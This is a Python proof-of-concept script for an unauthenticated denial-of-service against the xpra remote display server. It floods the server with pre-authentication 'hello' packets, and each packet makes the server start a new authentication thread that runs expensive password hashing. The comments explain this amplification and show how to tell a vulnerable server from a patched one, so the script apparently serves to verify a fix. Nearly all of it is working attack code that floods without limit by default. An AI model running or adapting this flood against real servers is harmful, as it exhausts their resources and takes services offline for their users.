#!/usr/bin/env python3
# Usage: python3 hello-flood-DoS-client.py HOST PORT [HELLOS]  (server must support YAML)
#
# Floods the server with pre-authentication `hello` packets.
#
# A normal client sends exactly one `hello` to open a connection (plus one more
# per authentication challenge round). The server has no per-connection limit on
# how many it will accept: each `hello` that passes the version / encoder checks
# ends in `GLib.idle_add(authenticate)` (see `ServerCore._process_hello`), and
# every one of those scheduled calls spawns a brand new `verify_auth` daemon
# thread running the full authenticator stack (PAM / bcrypt / file + socket
# opens). Password hashing is deliberately expensive, so a cheap packet from us
# becomes a thread + costly crypto on the server: an asymmetric amplifier that
# needs no credentials.
#
# On an unpatched server, watch (from another shell) the server process thread
# count and RSS climb as this runs:
#
#     ps -o nlwp=,rss= -p <server-pid>      # threads, resident KB
#
# A patched server should keep at most one in-flight `verify_auth` thread per
# connection and drop or reject the flood: the thread count stays flat.
#
# This targets a server that has authentication enabled (so the hellos stay
# pre-authentication and keep spawning auth threads). Point it at, e.g.:
#     xpra start :1240 --bind-tcp=0.0.0.0:14500,auth=password:value=xxxx

import socket
import sys
import threading
import time
import yaml

BLOCK = 64  # number of hellos per send() syscall

# a minimal but valid hello: a supported encoder and a protocol version the
# server will accept, and deliberately no "request" field so it proceeds to the
# authentication path rather than a one-shot unauthenticated request:
HELLO = ["hello", {"encoders": ["yaml"], "protocol-version": (7,)}]


def frame(packet) -> bytes:
    payload = yaml.safe_dump(packet).encode()
    # xpra packet header: 'P', proto_flags (0x04 = YAML), level, index, 4-byte payload size
    return b"P\x04\0\0" + len(payload).to_bytes(4, "big") + payload


def drain(sock: socket.socket) -> None:
    # keep reading and discarding the server's replies (challenges, disconnects),
    # so that the server's own send queue to us never blocks: that isolates this
    # test to the inbound hello-flood / auth-thread-spawn vector rather than the
    # outbound send-backlog one.
    try:
        while True:
            if not sock.recv(65536):
                return
    except OSError:
        return


def main() -> None:
    host = sys.argv[1]
    port = int(sys.argv[2])
    # 0 (the default) floods until the server disconnects us or Ctrl-C:
    hellos = int(sys.argv[3]) if len(sys.argv) > 3 else 0

    sock = socket.create_connection((host, port), timeout=10)
    sock.settimeout(30)
    threading.Thread(target=drain, args=(sock,), daemon=True).start()

    hello_block = frame(HELLO) * BLOCK

    sent = 0
    start = time.monotonic()
    try:
        while hellos == 0 or sent < hellos:
            sock.sendall(hello_block)
            sent += BLOCK
            if sent % (BLOCK * 100) == 0:
                rate = sent / (time.monotonic() - start)
                print(f"sent {sent} hellos ({rate:.0f}/s)", flush=True)
        print(f"sent all {sent} hellos and the server kept accepting them")
        print("-> the server did NOT limit pre-auth hellos (vulnerable: watch its thread count)")
    except (BrokenPipeError, ConnectionResetError, socket.timeout, OSError) as e:
        elapsed = time.monotonic() - start
        print(f"connection dropped after {sent} hellos in {elapsed:.1f}s: {e!r}")
        print("-> the server stopped the flood (good: a patched server caps pre-auth hellos)")
    except KeyboardInterrupt:
        print(f"\ninterrupted after sending {sent} hellos")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
